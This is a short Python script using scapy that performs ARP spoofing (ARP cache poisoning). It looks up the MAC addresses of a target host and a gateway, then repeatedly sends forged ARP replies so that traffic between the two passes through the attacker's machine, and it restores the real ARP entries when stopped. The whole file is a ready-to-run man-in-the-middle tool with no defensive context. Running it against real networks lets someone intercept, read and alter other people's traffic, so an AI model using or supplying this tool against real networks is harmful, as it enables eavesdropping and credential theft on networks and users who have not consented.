import scapy.all as scapy
import time
import optparse

count = 0


def get_mac_address(target_ip):
    arp_request_packet = scapy.ARP(pdst=target_ip)
    arp_broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = arp_broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip, poisoning_ip):
    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(pdst=target_ip, op=2, hwdst=target_mac, psrc=poisoning_ip)

    scapy.send(arp_response, verbose=False)


def reset_operation(victim_ip, gateway_ip):
    victim_mac = get_mac_address(victim_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(pdst=victim_ip, op=2, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)


def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options


user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        count += 2
        print("\rsending packets " + str(count), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)
